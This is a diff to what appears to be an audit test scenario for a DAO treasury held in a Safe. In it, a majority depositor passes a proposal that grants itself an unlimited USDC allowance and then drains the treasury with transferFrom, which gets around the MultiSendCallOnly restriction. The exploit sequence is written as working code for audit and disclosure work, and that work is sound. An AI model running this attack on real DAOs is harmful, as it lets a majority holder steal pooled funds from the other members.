@@ -5,11 +5,17 @@
  * C ragequits in grace. Expected (all demonstrated): C keeps its 1000; A and B lose 1000 each and F 50
  * although A voted NO; C's exit (16.4% of the high-water supply) is far below the 34% retention trigger,
  * which W's own deposit pushed out of reach: with W >= 66% of supply the others cannot trigger it at all.
+ *
+ * Phase 5 (ruling 6 / A3): the Safe's multisendLibrary is MultiSendCallOnly, so the delegatecall drainer
+ * this test used to express "whatever the Safe holds at execution" is refused on chain. The capture is
+ * unchanged and is expressed the way it now has to be: one call-only `USDC.approve(W, 2**128)`, and W
+ * pulls the balance with `transferFrom` in a second transaction after execution. The relay reports that
+ * allowance as usdcApproved / usdcAtRisk with a flag (T09), which is a disclosure, not a defence.
  */
 import { assert, deposit, fmt, fmtS, fund, processProposal, proposalInfo, propose, ragequit, read, runIfMain, seedMembers, SETTLEMENT_UNIT, shutdown, snapshot, step, verdict, vote, warpPastGrace, warpPastVoting } from "../../../scenarios/lib.js";
 import { encodeFunctionData } from "viem";
 
-import { bootAudit, deployAudit } from "./lib-audit.js";
+import { bootAudit } from "./lib-audit.js";
 
 export async function main(): Promise<void> {
   const mirror = await bootAudit("audit-eco01");
@@ -25,9 +31,8 @@ export async function main(): Promise<void> {
     const afterDep = await snapshot(mirror, "after W deposit", ["F", "A", "B", "C", "W"]);
     assert(dep.sharesMinted * 2n > afterDep.totalShares, `W holds ${fmt(dep.sharesMinted)} of ${fmt(afterDep.totalShares)} shares (> 50%)`);
 
-    step("W proposes: move the Safe's whole USDC balance at execution time to W (delegatecall Drainer, operation 1); W YES, A NO, B asleep");
-    const drainer = await deployAudit(mirror.actors.W, "Drainer");
-    const grab = await propose(mirror, "W", [{ to: drainer.address, operation: 1, data: encodeFunctionData({ abi: drainer.artifact.abi, functionName: "drain", args: [mirror.dao.settlement, W] }) }], "W: pay W 100% of the treasury (whatever remains at execution)");
+    step("W proposes: hand W an unlimited USDC allowance on the Safe (call-only, so it survives MultiSendCallOnly) = the Safe's whole balance at any later time; W YES, A NO, B asleep");
+    const grab = await propose(mirror, "W", [{ to: mirror.dao.settlement, data: encodeFunctionData({ abi: mirror.abi.settlement, functionName: "approve", args: [W, 2n ** 128n] }) }], "W: pay W 100% of the treasury (whatever remains at execution)");
     await vote(mirror, "W", grab.id, true);
     await vote(mirror, "A", grab.id, false);
     const info = await proposalInfo(mirror, grab.id);
@@ -50,6 +55,10 @@ export async function main(): Promise<void> {
     const wBefore = await read<bigint>(mirror, "settlement", "balanceOf", [W]);
     const result = await processProposal(mirror, "W", grab);
     assert(result.info.status.passed && !result.info.status.actionFailed, "proposal executed");
+    const safeAtExecution = await read<bigint>(mirror, "settlement", "balanceOf", [mirror.dao.safe]);
+    const pull = await mirror.actors.W.walletClient.writeContract({ address: mirror.dao.settlement, abi: mirror.abi.settlement, functionName: "transferFrom", args: [mirror.dao.safe, W, safeAtExecution], account: mirror.actors.W.account, chain: mirror.actors.W.chain });
+    await mirror.chain.publicClient.waitForTransactionReceipt({ hash: pull });
+    console.log(`   W pulled ${fmtS(safeAtExecution)} USDC with the voted allowance (tx ${pull}): no further vote, grace or proposal was involved`);
     const final = await snapshot(mirror, "final", ["F", "A", "B", "C", "W"]);
     const wAfter = final.settlement.W;
     const gain = wAfter - wBefore - wDeposit;
